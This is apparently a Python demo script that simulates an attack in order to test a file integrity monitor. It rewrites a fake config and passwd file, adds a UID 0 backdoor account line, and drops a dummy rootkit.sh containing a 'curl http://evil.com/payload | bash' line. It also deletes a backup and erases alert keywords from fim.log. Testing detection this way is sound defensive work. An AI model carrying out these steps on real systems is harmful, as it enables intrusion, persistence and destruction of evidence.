import os
import time
from rich.console import Console
from rich.panel import Panel
from rich import box

console = Console()

# Files we'll use in the simulation
TARGET_DIR = os.path.expanduser("~/test_directory")
CONFIG_FILE = os.path.join(TARGET_DIR, "system.conf")
PASSWD_FILE = os.path.join(TARGET_DIR, "passwd.txt")
MALWARE_FILE = os.path.join(TARGET_DIR, "rootkit.sh")
BACKUP_FILE = os.path.join(TARGET_DIR, "backup.txt")


def banner():
    console.print(Panel(
        "[bold red]FIM ATTACK SIMULATION[/bold red]\n"
        "[white]This script simulates a real attack scenario.[/white]\n"
        "[yellow]Watch your monitor terminal for alerts.[/yellow]",
        border_style="red",
        box=box.DOUBLE
    ))


def step(number, title, description):
    console.print(f"\n[bold cyan][ STEP {number} ][/bold cyan] [bold white]{title}[/bold white]")
    console.print(f"[dim]{description}[/dim]")
    time.sleep(2)


def main():
    banner()
    time.sleep(1)

    # Step 1 — Set up fake system files
    step(1, "Setting up target files",
         "Creating fake system files to monitor...")

    with open(CONFIG_FILE, "w") as f:
        f.write("admin_password=secret123\n")
        f.write("max_login_attempts=3\n")
        f.write("firewall=enabled\n")

    with open(PASSWD_FILE, "w") as f:
        f.write("root:x:0:0:root\n")
        f.write("rex:x:1000:1000:rex\n")

    with open(BACKUP_FILE, "w") as f:
        f.write("backup data: all systems nominal\n")

    console.print("[green]✓ Target files created[/green]")
    time.sleep(3)

    # Step 2 — Attacker modifies config file
    step(2, "ATTACK: Modifying system config",
         "Attacker disables firewall and changes admin password...")

    with open(CONFIG_FILE, "w") as f:
        f.write("admin_password=hacked123\n")
        f.write("max_login_attempts=999\n")
        f.write("firewall=disabled\n")

    console.print("[red]✗ Config file modified by attacker[/red]")
    time.sleep(3)

    # Step 3 — Attacker modifies passwd
    step(3, "ATTACK: Modifying passwd file",
         "Attacker adds a backdoor root account...")

    with open(PASSWD_FILE, "a") as f:
        f.write("backdoor:x:0:0:backdoor_account\n")

    console.print("[red]✗ Passwd file modified — backdoor account added[/red]")
    time.sleep(3)

    # Step 4 — Attacker drops malware
    step(4, "ATTACK: Dropping malware",
         "Attacker creates a malicious script...")

    with open(MALWARE_FILE, "w") as f:
        f.write("#!/bin/bash\n")
        f.write("# rootkit installer\n")
        f.write("curl http://evil.com/payload | bash\n")

    console.print("[red]✗ Malware file dropped on system[/red]")
    time.sleep(3)

    # Step 5 — Attacker deletes backup
    step(5, "ATTACK: Destroying backups",
         "Attacker deletes backup file to prevent recovery...")

    os.remove(BACKUP_FILE)
    console.print("[red]✗ Backup file deleted[/red]")
    time.sleep(3)

    # Step 6 — Attacker tries to cover tracks
    step(6, "COVER UP: Tampering with log",
         "Attacker tries to edit fim.log to erase evidence...")

    try:
        with open("fim.log", "r") as f:
            content = f.read()

        # Simulate attacker deleting log content
        tampered = content.replace("CRITICAL", "").replace("WARNING", "")

        with open("fim.log", "w") as f:
            f.write(tampered)

        console.print("[red]✗ Attacker tampered with fim.log[/red]")
    except FileNotFoundError:
        console.print("[yellow]⚠ No log file found to tamper with[/yellow]")

    time.sleep(2)

    # Step 7 — FIM catches the tampering
    step(7, "FIM RESPONSE: Verifying log integrity",
         "Running HMAC verification on fim.log...")

    console.print("\n[bold green]Running: python3 alerts.py[/bold green]\n")
    os.system("python3 alerts.py")

    # Final summary
    console.print(Panel(
        "[bold green]SIMULATION COMPLETE[/bold green]\n\n"
        "[white]Your FIM detected:[/white]\n"
        "[yellow]  ✓ Config file modification[/yellow]\n"
        "[yellow]  ✓ Passwd file backdoor[/yellow]\n"
        "[yellow]  ✓ Malware file dropped[/yellow]\n"
        "[yellow]  ✓ Backup file deleted[/yellow]\n"
        "[yellow]  ✓ Log tampering attempt[/yellow]\n\n"
        "[bold red]Attacker failed to cover their tracks.[/bold red]",
        border_style="green",
        box=box.DOUBLE
    ))


if __name__ == "__main__":
    main()
